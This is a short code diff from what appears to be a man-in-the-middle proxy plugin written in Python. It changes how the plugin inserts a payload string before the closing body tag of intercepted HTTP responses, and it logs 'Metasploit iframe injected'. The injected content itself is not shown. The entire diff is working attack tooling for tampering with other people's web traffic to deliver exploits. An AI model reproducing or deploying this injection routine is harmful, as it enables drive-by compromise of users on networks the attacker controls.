@@ -1,6 +1,7 @@
 #!/usr/bin/python
 import urllib2
-from BeautifulSoup import BeautifulSoup
+import re
+#from BeautifulSoup import BeautifulSoup
 import support.header as header
 
 ### CHANGE AS NEEDED
@@ -27,10 +28,8 @@ def doResponse(session, request_header, response_header, data):
   if header.headertest(request_header, request_match) & header.headertest(response_header, response_match):
 
     ### MANIPULATE DATA - INSERT SCRIPT
-    soup = BeautifulSoup(data)
-    soup.body.insert(-1, code1)
+    data = re.sub('</body>', code1 + '</body>', data)
     changed = 1
-    data = str(soup)
     print("Metasploit iframe injected")
 
   ### RETURN DATA
